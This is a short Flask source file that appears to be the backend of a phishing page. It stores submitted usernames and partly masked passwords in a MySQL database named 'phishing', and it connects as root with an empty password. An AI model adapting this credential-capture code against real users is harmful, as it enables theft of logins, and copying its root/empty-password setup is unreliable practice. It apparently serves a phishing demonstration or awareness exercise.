from flask import Flask
from flask import render_template
from flask import request
from flask_mysqldb import MySQL

app = Flask(__name__)

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = ''
app.config['MYSQL_DB'] = 'phishing'
 
mysql = MySQL(app)



@app.route("/")
def index():
    return render_template('index.html')

@app.route('/login', methods = ['POST', 'GET'])
def login():
    if request.method == 'GET':
        return "Login via the login Form"
     
    if request.method == 'POST':
        username = request.form['user']
        password = request.form['pass']
        password = password[-2:].rjust(len(password), '*')
        cursor = mysql.connection.cursor()
        cursor.execute(''' INSERT INTO credentials VALUES(%s,%s)''',(username,password))
        mysql.connection.commit()
        cursor.close()
        return f"Done!!"

app.run(host='localhost', port=5000)
